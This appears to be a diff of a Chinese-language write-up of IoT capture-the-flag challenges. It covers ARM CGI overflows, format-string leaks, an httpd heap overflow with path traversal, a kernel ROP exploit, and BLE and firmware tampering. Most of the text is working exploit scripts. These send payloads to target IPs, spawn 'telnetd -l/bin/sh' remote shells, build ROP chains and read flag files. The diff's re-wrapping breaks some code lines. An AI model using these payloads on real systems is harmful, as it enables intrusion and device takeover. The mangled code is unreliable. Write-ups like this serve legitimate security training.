-export REQUEST_METHOD=POSTexport HTTP_COOKIES='uuid=nocbtm@hatlab!!!'export CONTENT_LENGTH=3000export CONTENT_TYPE='application/x-www-form-urlencoded'cat payload.txt | gdbserver 0.0.0.0:1234 ./var/www/cgi-bin/55.cgi
+export REQUEST_METHOD=POSTexport HTTP_COOKIES='uuid=nocbtm@hatlab!!!'export CONTENT_LENGTH=3000export CONTENT_TYPE='application/x-www-form-urlencoded'cat payload.txt | gdbserver 0.0.0.0:
+1234 ./var/www/cgi-bin/55.cgi
 
 也可以用qemu的方式来进行模拟调试
 
@@ -281,13 +426,14 @@ gdb-multiarch ./55.cgi -x xgdb.sh
 
 其中 xgdb.sh 如下
 
-set architecture arm │0x407ff6d4: 'C' <repeats 200 times>...set endian little │0x407ff79c: 'C' <repeats 200 times>... │0x407ff864: 'C' <repeats 160 times>, "334t 01"b *0x10B34 │0x407ff908: ""b *0x10B44 │0x407ff909: ""target remote 127.0.0.1:1234
+set architecture arm │0x407ff6d4: 'C' <repeats 200 times>...set endian little │0x407ff79c: 'C' <repeats 200 times>... │0x407ff864: 'C' <repeats 160 times>, "334t 01"b *0x10B34 │0x407ff908: ""b *0x10B44 │0x407ff909: ""target remote 127.0.0.1:
+1234
 
 3. 解题脚本
 
 import requests from pwn import * import binascii
 IP = "20.21.2.27"
-url = "http://{}/cgi-bin/63.cgi".format(IP)uuid = ""for i in range(2, 6): r = requests.get( url=url, headers={"COOKIES": "uuid=%{}$x".format(str(i))} ) res = r.text.split('n')[0] uuid += binascii.unhexlify(res).decode()[::-1] print(uuid) 
+url = "http://{}/cgi-bin/63.cgi".format(IP)uuid = ""for i in range(2, 6): r = requests.get( url=url, headers={"COOKIES": "uuid=%{}$x".format(str(i))} ) res = r.text.split('n')[0] uuid += binascii.unhexlify(res).decode()[::-1] print(uuid)
 url = "http://{}/cgi-bin/55.cgi".format(IP)payload = b"*#$^" + b"xff" * 3 + b"xff" * 3 payload = payload.ljust(0x2b0, b"B") payload += b'telnetd -p6789 -l/bin/sh;' payload = payload.ljust(0x5A8, b"C") payload += p32(0x000109DC) r = requests.post( url=url, headers={ "COOKIES": "uuid={}".format(uuid), "Content-Type": "application/x-www-form-urlencoded" }, data=payload)
 sleep(2)os.system("telnet {} 6789".format(IP))
 
@@ -321,14 +467,18 @@ gdb可以从 httpd 程序调试到cgi程序，只要设置好断点，保证程�
 
 4. 解题脚本
 
-#!/usr/bin/env python#-*- coding:utf-8 -*-# @Author : nocbtm
+#!/usr/bin/env python#-*- coding:
+utf-8 -*-# @Author : nocbtm
 
-import osimport sysfrom pwn import *
-context(arch='arm', os='linux', endian='little', word_size=32)# context.log_level = 'debug'
+import osimport sys
+from pwn import *
+context(arch='arm', os='linux', endian='little', word_size=32)
+# context.log_level = 'debug'
 if len(sys.argv) < 3: print("[+] Example python exp.py ip port") exit(-1)
 IP = sys.argv[1]PORT = sys.argv[2]HOST = IP + ":" + str(PORT)command = "telnetd -p6789 -l/bin/sh"
 """func returnPOP {R4-R11,PC}"""
-# a 0x61# z 0x7a
+# a 0x61
+# z 0x7a
 
 binary_path = './www/cgi-bin/flc_cgi.cgi'libc_path = './lib/libc-2.13.so'
 libc = ELF(libc_path)
@@ -347,8 +497,10 @@ buf2 += p32(command_addr+7) + p32(kong_addr) + p32(0x01010101)*2 + p32(strcpy_ad
 buf2 += p32(command_addr) + p32(0xbefffb74) + p32(0xbefffb74) + p32(command_addr)+ p32(0x90B4)action = 'action=command&command=network&{}=1'.format(buf2)
 
 payload = ''payload += 'GET /cgi-bin/flc_cgi.cgi?{} HTTP/1.1rn'.format(action)payload += 'Host: {}rn'.format(HOST)payload += 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0rn'payload += 'Content-Type: application/octet-streamrn'payload += 'X-Requested-With: XMLHttpRequestrn'payload += 'Referer: http://192.168.0.1/fm.htmlrn'payload += 'rn'
-while True: try: sleep(0.1) p = remote(IP, PORT) p.send(payload) content = p.recv() print(content) if 'HTTP' in content: try: p = remote(IP, 6789) if p: print("Attack Success") break except: p.close() pass
- except: p.close() pass
+while True: try: sleep(0.1) p = remote(IP, PORT) p.send(payload) content = p.recv() print(content) if 'HTTP' in content: try: p = remote(IP, 6789) if p: print("Attack Success") break 
+except: p.close() pass
+ 
+except: p.close() pass
 print("Now you can telnet {} 6789".format(IP))os.system("telnet {} 6789".format(IP))
 
 本题考察了一道命令注入绕过和缓冲区未初始化漏洞的场景题，题目为一道CLI题，连接到对应的端口后会有提示。
@@ -357,7 +509,8 @@ print("Now you can telnet {} 6789".format(IP))os.system("telnet {} 6789".format(
 
 在get_input命令处会对一系列的敏感字符进行过滤：
 
-if(c[idx] == '-' || c[idx] == ';' || c[idx] == '|' || c[idx] == '`' || c[idx] == '&' || c[idx] == '$' || c[idx] == '!' || c[idx] == '(' || c[idx] == ')' || c[idx] == ''' || c[idx] == '"'){ SIM_SYSLOG_OP("Illegal input!");return -1;        }
+if(c[idx] == '-' || c[idx] == ';' || c[idx] == '|' || c[idx] == '`' || c[idx] == '&' || c[idx] == '$' || c[idx] == '!' || c[idx] == '(' || c[idx] == ')' || c[idx] == ''' || c[idx] == '"'){ SIM_SYSLOG_OP("Illegal input!");
+return -1;        }
 
 但是这里的ip缓冲区并未进行清空内存，在第二次输入时会有残留的数据，同时get_input函数也不会对敏感的字符进行清除，导致可以两次调用logs_download并构造payload：
 
@@ -416,7 +569,8 @@ CC=/usr/bin/arm-linux-gnueabi-gcc ./configure
 
 经对程序逆向及题目附件,可以发现其实并没有太多可以用的功能,就一个登陆界面以及登陆成功后的index.html,其文件系统中www下:
 
-❯ ls -altotal 16drwxr-xr-x 1 iot iot 128 Mar 9 14:33 .drwxr-xr-x 1 iot iot 256 Mar 15 11:29 ..-rw-r--r-- 1 iot iot 19 Mar 9 14:33 .htpasswd-rw-r--r-- 1 iot iot 221 Mar 9 14:33 index.html❯ cat .htpasswd admin:tp2A/UzJN/Vr
+❯ ls -altotal 16drwxr-xr-x 1 iot iot 128 Mar 9 14:33 .drwxr-xr-x 1 iot iot 256 Mar 15 11:29 ..-rw-r--r-- 1 iot iot 19 Mar 9 14:33 .htpasswd-rw-r--r-- 1 iot iot 221 Mar 9 14:33 index.html❯ cat .htpasswd admin:
+tp2A/UzJN/Vr
 
 其负责用户验证的.htpasswd文件,也是经过加密的字符串.
 
@@ -424,7 +578,10 @@ CC=/usr/bin/arm-linux-gnueabi-gcc ./configure
 
 第一个漏洞点存在于解析http请求的httpd_parse_request函数:
 
-可以看到其在处理Accept-Encoding:字段时,在最后是往结构体hc中的accept上写的数据,并不是accepte,如果在Accept:字段把数据发送的小一些,在Accept-Encoding:数据发送的大一些,这会导致堆溢出,可以覆盖到后面的变量数据.
+可以看到其在处理Accept-Encoding:
+字段时,在最后是往结构体hc中的accept上写的数据,并不是accepte,如果在Accept:
+字段把数据发送的小一些,在Accept-Encoding:
+数据发送的大一些,这会导致堆溢出,可以覆盖到后面的变量数据.
 
 第二个漏洞点存在与用户认证的auth_check2函数:
 
@@ -468,12 +625,18 @@ Authorization: Basic -====
 
 3. 脚本
 
-#!/usr/bin/env python# encoding: utf-8from pwn import *import timecontext.log_level = 'debug'
-# for hc->origfilename in a specific location url = '/'+'a'*0xC8Accept = 'b'AcceptE = 'c'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:80rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p = remote("20.21.2.27",80)p.send(payload)p.recv()
+#!/usr/bin/env python
+# encoding: utf-8
+from pwn import *import timecontext.log_level = 'debug'
+# for hc->origfilename in a specific location url = '/'+'a'*0xC8Accept = 'b'AcceptE = 'c'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:
+80rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p = remote("20.21.2.27",80)p.send(payload)p.recv()
 # for &authpath chunk
-url = '/index.html'Accept = 'b'AcceptE = 'c'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:80rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p = remote("20.21.2.27",80)p.send(payload)p.recv()
+url = '/index.html'Accept = 'b'AcceptE = 'c'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:
+80rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p = remote("20.21.2.27",80)p.send(payload)p.recv()
 
-sleep(3)# for change hc->origfilenamep = remote("20.21.2.27",80)url = '/'Accept = 'b'AcceptE = 'c'*0x1468+'../../flag.txt'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:80rn'payload += 'Authorization: Basic -====rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p.send(payload)p.recv()p.close()
+sleep(3)
+# for change hc->origfilenamep = remote("20.21.2.27",80)url = '/'Accept = 'b'AcceptE = 'c'*0x1468+'../../flag.txt'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:
+80rn'payload += 'Authorization: Basic -====rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p.send(payload)p.recv()p.close()
 
 在选手物料中有一块绿色PINOUT板，将其FPC软排线接在标记为”MCU”的连接器上，即可通过该绿色板子与UART和USBASP编程器连接。
 
@@ -515,7 +678,8 @@ data < -(k0, k1, k2...k6); r < -("_", ".")for i < - 0 to 6 MOSI_enc(r, data[i]) 
 
 2. 提取固件
 
-这道题目一开始给的定位是签到题，所以就没有锁死熔丝位，连大佬说的lockbits也没有加，可以直接使用avrdude -F -c usbasp -p atmega328p -U flash:r:base64.hex提取固件。
+这道题目一开始给的定位是签到题，所以就没有锁死熔丝位，连大佬说的lockbits也没有加，可以直接使用avrdude -F -c usbasp -p atmega328p -U flash:r:
+base64.hex提取固件。
 
 3. 静态分析
 
@@ -585,7 +749,11 @@ ttySAK1为机器人控制移动主板串口设备
 
 漏洞函数在linux/drivers/scsi/sd.c的sd_revalidate_disk函数里面。本题创建了一个扇区大小的缓冲区，但在读磁盘数据的时候读的是扇区数量的数据，从而造成了缓冲区溢出。sdp->sector_size时扇区大小，一般都是512。sdkp->capacity是扇区数量。
 
-void sd_read_disk_check(struct scsi_disk *sdkp){struct scsi_sense_hdr sshdr;struct scsi_device *sdp = sdkp->device;unsigned char data_buffer[sdp->sector_size];unsigned char rdCmd[10] = {READ_10, 0, 0, 0, 0, 0, 0, 0, 0, 0};int i = 0;
+void sd_read_disk_check(struct scsi_disk *sdkp){struct scsi_sense_hdr sshdr;
+struct scsi_device *sdp = sdkp->device;
+unsigned char data_buffer[sdp->sector_size];
+unsigned char rdCmd[10] = {READ_10, 0, 0, 0, 0, 0, 0, 0, 0, 0};
+int i = 0;
 char cap_str_10[10]; string_get_size(sdkp->capacity, sdp->sector_size, STRING_UNITS_10, cap_str_10, sizeof(cap_str_10)); sd_printk(KERN_NOTICE, sdkp,"size:%x,%x,%sn", sdkp->capacity, sdp->sector_size, cap_str_10);
 if(sdkp->capacity*sdp->sector_size>10485760)return;
  rdCmd[2] = (unsigned char)((0 >> 24) & 0xff); rdCmd[3] = (unsigned char)((0 >> 16) & 0xff); rdCmd[4] = (unsigned char)((0 >> 8) & 0xff); rdCmd[5] = (unsigned char)(0 & 0xff); rdCmd[7] = (unsigned char)(((sdkp->capacity) >> 8) & 0xff); rdCmd[8] = (unsigned char)((sdkp->capacity) & 0xff);
@@ -607,42 +775,54 @@ typedef void (*SET_FS_KERNEL_TIPS)(void);#define SET_FS_KERNEL_TIPS ((SET_FS_KER
 typedef void (*FSYNC_TIPS)(void *file);#define FSYNC_TIPS ((FSYNC_TIPS)0xffffff8008087af4)
 typedef int (*PRINTK)(const char *fmt, ...);#define PRINTK ((PRINTK)0xffffff800811b374)
 void _start(void){unsigned char buf_read[16];
-void *fp1;void *fp2;loff_t pos1, pos2; PRINTK("start successnn"); SET_FS_KERNEL_TIPS();
+void *fp1;
+void *fp2;loff_t pos1, pos2; PRINTK("start successnn"); SET_FS_KERNEL_TIPS();
  fp1 = FILP_OPEN("/dev/sda"); fp2 = FILP_OPEN("/flag");
- VFS_READ(fp2, buf_read, 16);int ret = VFS_WRITE(fp1, buf_read, 16); FSYNC_TIPS(fp1);}
+ VFS_READ(fp2, buf_read, 16);
+int ret = VFS_WRITE(fp1, buf_read, 16); FSYNC_TIPS(fp1);}
 
 因为内核开了nx保护，所以不能直接在栈上执行shellcode。在用户态一般执行的方法是调用mprotect，但在内核态不行。因为mprotect是通过获取当前进程的内存描述符mm查找vma（虚拟内存区域），然后修改vma的flag属性达到关闭nx的目的。但在内核态没有内存描述符，所以调用mprotect会报错。还有一种方法是通过修改页表属性关闭nx，Linux 64位内核采用4级页表实现虚拟地址到物理地址的转换，可以通过虚拟地址找到pgd->pud->pmd->pte，最后修改pte的属性。这里选择的方法是用memcpy将shellcode拷贝到一段可执行区域。比赛提供的调试板可以通过cat /sys/kernel/debug/kernel_page_tables看到整个内核的内存空间。
 
 exp如下：
 
-#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <arpa/inet.h>#include <string.h>
+#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include #include <arpa/inet.h>#include <string.h>
 #define ROP1 0xffffff80083e2e90#define ROP2 0xffffff800825fbe8#define ROP3 0xffffff80083e86fc#define memcpy_addr 0xffffff8008290e00#define buf_addr 0xffffff8000836000#define memcpy_num 0x500
 int main(){ FILE *fp1; FILE *fp2;
  fp1 = fopen("payload", "w+");if (!fp1)return -1;
-size_t rop[0x1000] = {0};int count = 0;memset(rop, 'a', 0x208); count += 0x208 / 8; rop[count++] = ROP1; rop[count++] = ROP2; rop[count++] = buf_addr; rop[count++] = ROP3;memset(rop + count, 'a', 0x48); count += 0x48 / 8; rop[count++] = memcpy_num; rop[count++] = memcpy_addr;memset(rop + count, 'a', 0x60); count += 0x60 / 8;
+size_t rop[0x1000] = {0};
+int count = 0;memset(rop, 'a', 0x208); count += 0x208 / 8; rop[count++] = ROP1; rop[count++] = ROP2; rop[count++] = buf_addr; rop[count++] = ROP3;memset(rop + count, 'a', 0x48); count += 0x48 / 8; rop[count++] = memcpy_num; rop[count++] = memcpy_addr;memset(rop + count, 'a', 0x60); count += 0x60 / 8;
  fp2 = fopen("shellcode.bin", "r");if (!fp2)return -1;
- fseek(fp2, 0, SEEK_END);int len = ftell(fp2); fseek(fp2, 0, SEEK_SET);size_t *buffer = malloc(len); len = fread(buffer, sizeof(char), len, fp2);memcpy(rop + count, buffer, len); count += len / 8 + 1;if (count < 1024 / 8 + 1) {memset(rop + count, 'a', 1024 / 8 + 1 - count); count += 1024 / 8 + 1 - count; }
- fwrite(rop, sizeof(size_t), count, fp1);free(buffer); fclose(fp1); fclose(fp2);return 0;}
+ fseek(fp2, 0, SEEK_END);
+int len = ftell(fp2); fseek(fp2, 0, SEEK_SET);
+size_t *buffer = malloc(len); len = fread(buffer, sizeof(char), len, fp2);memcpy(rop + count, buffer, len); count += len / 8 + 1;if (count < 1024 / 8 + 1) {memset(rop + count, 'a', 1024 / 8 + 1 - count); count += 1024 / 8 + 1 - count; }
+ fwrite(rop, sizeof(size_t), count, fp1);free(buffer); fclose(fp1); fclose(fp2);
+return 0;}
 
 1.  使用 bluescan 扫描可以发现如下信息：
 
 $ sudo bluescan -m leAddr: 40:0F:CA:5A:C3:09 Addr type: random
-Connectable: TrueRSSI: -27 dBmGeneral Access Profile:Flags: LE General Discoverable ModeBR/EDR Not SupportedComplete Local Name: FlagInFlash
+Connectable: TrueRSSI: -27 dBmGeneral Access Profile:
+Flags: LE General Discoverable ModeBR/EDR Not SupportedComplete Local Name: FlagInFlash
 $ sudo bluescan -m gatt 40:0F:CA:5A:C3:09----------------GATT Scan Result----------------Number of services: 4
 
 Service (0x0001 - 0x0001, 0 characteristics)DeclarationHandle: 0x0001Type: 2800 (Primary Service declaration)Value: 1801 (Generic Attribute)Permissions: Read (no authen/author)
 Service (0x0002 - 0x0006, 2 characteristics)DeclarationHandle: 0x0002Type: 2800 (Primary Service declaration)Value: 1800 (Generic Access)Permissions: Read (no authen/author)
-Characteristic (0 descriptors)DeclarationHandle: 0x0003Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0004UUID: 2A00 (Device Name)Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0x0003Type: 2803 (Characteristic declaration)Value:
+Properties: ReadHandle: 0x0004UUID: 2A00 (Device Name)Permissions: Read (no authen/author)
 Value declarationHandle: 0x0004Type: 2A00 (Device Name)Value: b'FlagInFlash'Permissions: Higher layer specific
-Characteristic (0 descriptors)DeclarationHandle: 0x0005Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0006UUID: 2A01 (Appearance)Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0x0005Type: 2803 (Characteristic declaration)Value:
+Properties: ReadHandle: 0x0006UUID: 2A01 (Appearance)Permissions: Read (no authen/author)
 Value declarationHandle: 0x0006Type: 2A01 (Appearance)Value: b'x00x02'Permissions: Higher layer specific
 Service (0x0007 - 0x0009, 1 characteristics)DeclarationHandle: 0x0007Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-FFFF-FFFFFFFFFFFF (Unknown)Permissions: Read (no authen/author)
-Characteristic (0 descriptors)DeclarationHandle: 0x0008Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0009UUID: 1111 (Unknown)Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0x0008Type: 2803 (Characteristic declaration)Value:
+Properties: ReadHandle: 0x0009UUID: 1111 (Unknown)Permissions: Read (no authen/author)
 Value declarationHandle: 0x0009Type: 1111 (Unknown)Value: b'FFFFFF00CYW920819EVB-02'Permissions: Higher layer specific
 Service (0xff00 - 0xff05, 2 characteristics)DeclarationHandle: 0xff00Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-8635-82AD38A1381F (Guess: WICED - OTA)Permissions: Read (no authen/author)
-Characteristic (1 descriptors)DeclarationHandle: 0xff01Type: 2803 (Characteristic declaration)Value:Properties: Indicate, Notify, WriteHandle: 0xff02UUID: A3DD50BF-F7A7-4E99-838E-570A086C661B (Guess: WICED - OTA Control Point)Permissions: Read (no authen/author)
+Characteristic (1 descriptors)DeclarationHandle: 0xff01Type: 2803 (Characteristic declaration)Value:
+Properties: Indicate, Notify, WriteHandle: 0xff02UUID: A3DD50BF-F7A7-4E99-838E-570A086C661B (Guess: WICED - OTA Control Point)Permissions: Read (no authen/author)
 DescriptorHandle: 0xff03Type: 2902 (Client Characteristic Configuration declaration)Value: b'x00x00'Permissions: Read (no authen/author), Write (higher layer specifies authen/author)
-Characteristic (0 descriptors)DeclarationHandle: 0xff04Type: 2803 (Characteristic declaration)Value:Properties: WriteHandle: 0xff05UUID: A2E86C7A-D961-4091-B74F-2409E72EFE26 (Guess: WICED - OTA Data)Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0xff04Type: 2803 (Characteristic declaration)Value:
+Properties: WriteHandle: 0xff05UUID: A2E86C7A-D961-4091-B74F-2409E72EFE26 (Guess: WICED - OTA Data)Permissions: Read (no authen/author)
 
 根据扫描结果可知：
 
@@ -663,17 +843,22 @@ $ sudo bluescan -m gatt----------------GATT Scan Result----------------Number of
 
 Service (0x0001 - 0x0001, 0 characteristics)DeclarationHandle: 0x0001Type: 2800 (Primary Service declaration)Value: 1801 (Generic Attribute)Permissions: Read (no authen/author)
 Service (0x0002 - 0x0006, 2 characteristics)DeclarationHandle: 0x0002Type: 2800 (Primary Service declaration)Value: 1800 (Generic Access)Permissions: Read (no authen/author)
-Characteristic (0 descriptors)DeclarationHandle: 0x0003Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0004UUID: 2A00 (Device Name)Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0x0003Type: 2803 (Characteristic declaration)Value:
+Properties: ReadHandle: 0x0004UUID: 2A00 (Device Name)Permissions: Read (no authen/author)
 Value declarationHandle: 0x0004Type: 2A00 (Device Name)Value: b'FlagInFlash-Writeup'Permissions: Higher layer specific
-Characteristic (0 descriptors)DeclarationHandle: 0x0005Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0006UUID: 2A01 (Appearance)Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0x0005Type: 2803 (Characteristic declaration)Value:
+Properties: ReadHandle: 0x0006UUID: 2A01 (Appearance)Permissions: Read (no authen/author)
 Value declarationHandle: 0x0006Type: 2A01 (Appearance)Value: b'x00x02'Permissions: Higher layer specific
 Service (0x0007 - 0x0009, 1 characteristics)DeclarationHandle: 0x0007Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-FFFF-FFFFFFFFFFFF (Unknown)Permissions: Read (no authen/author)
-Characteristic (0 descriptors)DeclarationHandle: 0x0008Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0009UUID: 1111 (Unknown)Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0x0008Type: 2803 (Characteristic declaration)Value:
+Properties: ReadHandle: 0x0009UUID: 1111 (Unknown)Permissions: Read (no authen/author)
 Value declarationHandle: 0x0009Type: 1111 (Unknown)Value: b'flag{sEcvRe_yOur_oTA!}'Permissions: Higher layer specific
 Service (0xff00 - 0xff05, 2 characteristics)DeclarationHandle: 0xff00Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-8635-82AD38A1381F (Guess: WICED - OTA)Permissions: Read (no authen/author)
-Characteristic (1 descriptors)DeclarationHandle: 0xff01Type: 2803 (Characteristic declaration)Value:Properties: Indicate, Notify, WriteHandle: 0xff02UUID: A3DD50BF-F7A7-4E99-838E-570A086C661B (Guess: WICED - OTA Control Point)Permissions: Read (no authen/author)
+Characteristic (1 descriptors)DeclarationHandle: 0xff01Type: 2803 (Characteristic declaration)Value:
+Properties: Indicate, Notify, WriteHandle: 0xff02UUID: A3DD50BF-F7A7-4E99-838E-570A086C661B (Guess: WICED - OTA Control Point)Permissions: Read (no authen/author)
 DescriptorHandle: 0xff03Type: 2902 (Client Characteristic Configuration declaration)Value: b'x00x00'Permissions: Read (no authen/author), Write (higher layer specifies authen/author)
-Characteristic (0 descriptors)DeclarationHandle: 0xff04Type: 2803 (Characteristic declaration)Value:Properties: WriteHandle: 0xff05UUID: A2E86C7A-D961-4091-B74F-2409E72EFE26 (Guess: WICED - OTA Data)        Permissions: Read (no authen/author)
+Characteristic (0 descriptors)DeclarationHandle: 0xff04Type: 2803 (Characteristic declaration)Value:
+Properties: WriteHandle: 0xff05UUID: A2E86C7A-D961-4091-B74F-2409E72EFE26 (Guess: WICED - OTA Data)        Permissions: Read (no authen/author)
 
 可知 flag 为 sEcvRe_yOur_oTA!。
 
@@ -703,250 +888,223 @@ tip：这文章是小编职业生涯最大挑战之二，之一请大家回顾�
 
 
 ```
-dfu-util 0.9Copyright 2005-2009 Weston Schmidt, Harald Welte and OpenMoko Inc.Copyright 2010-2016 Tormod Volden and Stefan SchmidtThis program is Free Software and has ABSOLUTELY NO WARRANTYPlease report bugs to http://sourceforge.net/p/dfu-util/tickets/Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=4, name="rom", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=3, name="kernel", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=2, name="env", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=1, name="u-boot", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=0, name="all", serial="UNKNOWN"
-```
-
-
-
-```
+dfu-util 0.9Copyright 2005-2009 Weston Schmidt, Harald Welte and OpenMoko Inc.Copyright 2010-2016 Tormod Volden and Stefan SchmidtThis program is Free Software and has ABSOLUTELY NO WARRANTYPlease report bugs to http://sourceforge.net/p/dfu-util/tickets/Found DFU: [1f3a:
+1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=4, name="rom", serial="UNKNOWN"Found DFU: [1f3a:
+1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=3, name="kernel", serial="UNKNOWN"Found DFU: [1f3a:
+1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=2, name="env", serial="UNKNOWN"Found DFU: [1f3a:
+1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=1, name="u-boot", serial="UNKNOWN"Found DFU: [1f3a:
+1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=0, name="all", serial="UNKNOWN"
 dfu-util -R -a kernel -U kernel.itb
-```
-
-
-
-```
 dumpimage -l kernel.itbFIT description: Generic Allwinner FIT ImageCreated: Wed Mar 9 22:38:14 2022Image 0 (kernel-1)Description: Linux kernelCreated: Wed Mar 9 22:38:14 2022Type: Kernel ImageCompression: uncompressedData Size: 4579584 Bytes = 4472.25 KiB = 4.37 MiBArchitecture: ARMOS: LinuxLoad Address: 0x80000000Entry Point: 0x80000000Hash algo: sha1Hash value: 2bf3fcc2fbb60832f5449f7f15c236321c9920b5Image 1 (initrd-1)Description: Linux initrdCreated: Wed Mar 9 22:38:14 2022Type: RAMDisk ImageCompression: uncompressedData Size: 4133979 Bytes = 4037.09 KiB = 3.94 MiBArchitecture: ARMOS: LinuxLoad Address: unavailableEntry Point: unavailableHash algo: sha1Hash value: 170343129ac6eb0ce7268ecabac2aabb591c3090Image 2 (fdt-1)Description: Flattened Device Tree blobCreated: Wed Mar 9 22:38:14 2022Type: Flat Device TreeCompression: uncompressedData Size: 16195 Bytes = 15.82 KiB = 0.02 MiBArchitecture: ARMHash algo: sha1Hash value: 041dedf1ecb4dbf9f52aa5bb56bf5850c57e6aacDefault Configuration: 'conf-1'Configuration 0 (conf-1)Description: Linux Bootable FITKernel: kernel-1Init Ramdisk: initrd-1FDT: fdt-1Hash algo: crc32 Hash value: unavailable
-```
-
-
-
-```
-dumpimage -l kernel.itb -p 0 -o kernel_1dumpimage -l kernel.itb -p 1 -o initrd_1dumpimage -l kernel.itb -p 2 -o fdt.dtbExtracted:Image 2 (fdt-1)Description: Flattened Device Tree blobCreated: Wed Mar 9 22:38:14 2022Type: Flat Device TreeCompression: uncompressedData Size: 16195 Bytes = 15.82 KiB = 0.02 MiBArchitecture: ARMHash algo: sha1 Hash value: 041dedf1ecb4dbf9f52aa5bb56bf5850c57e6aac
-```
-
-
-
-```
+dumpimage -l kernel.itb -p 0 -o kernel_1dumpimage -l kernel.itb -p 1 -o initrd_1dumpimage -l kernel.itb -p 2 -o fdt.dtbExtracted:
+Image 2 (fdt-1)Description: Flattened Device Tree blobCreated: Wed Mar 9 22:38:14 2022Type: Flat Device TreeCompression: uncompressedData Size: 16195 Bytes = 15.82 KiB = 0.02 MiBArchitecture: ARMHash algo: sha1 Hash value: 041dedf1ecb4dbf9f52aa5bb56bf5850c57e6aac
 dtc -I dtb -O dts fdt.dtb > fdt.dts
-```
-
-
-
-```
 chosen {#address-cells = <0x01>;#size-cells = <0x01>; ranges; bootargs = "console=ttyS0,115200 rdinit=/bin/sh";};
-```
-
-
-
-```
 dtc -I dts -O dtb fdt.dts >fdt.dtb
-```
-
-
-
-```
 /dts-v1/;/ { description = "Generic Allwinner FIT Image";#address-cells = <1>; images { kernel-1 { description = "Linux kernel"; data = /incbin/("kernel_1");type = "kernel"; arch = "arm"; os = "linux"; compression = "none"; load = <0x80000000>; entry = <0x80000000>;hash@1 { algo = "sha1"; }; }; initrd-1 { description = "Linux initrd"; data = /incbin/("initrd_1");type = "ramdisk"; arch = "arm"; os = "linux"; compression = "none";hash@1 { algo = "sha1"; }; }; fdt-1 { description = "Flattened Device Tree blob"; data = /incbin/("fdt.dtb");type = "flat_dt"; arch = "arm"; compression = "none";hash@1 { algo = "sha1"; }; }; }; configurations { default = "conf-1"; conf-1 { description = "Linux Bootable FIT"; kernel = "kernel-1"; fdt = "fdt-1"; ramdisk="initrd-1";hash@0 { algo = "crc32"; }; }; };};
-```
-
-
-
-```
 mkimage -f kernel.its kernel.itb
-```
-
-
-
-```
 dfu-util -R -a kernel -D kernel.itb
-```
-
-
-
-```
 mosquitto_pub -t 2022/hatlab/flag -h IP -m "oiU7m9ipyqFdzkUFb1vfkabZ7IqiAefslrc3ovql2dA="
-```
-
-
-
-```
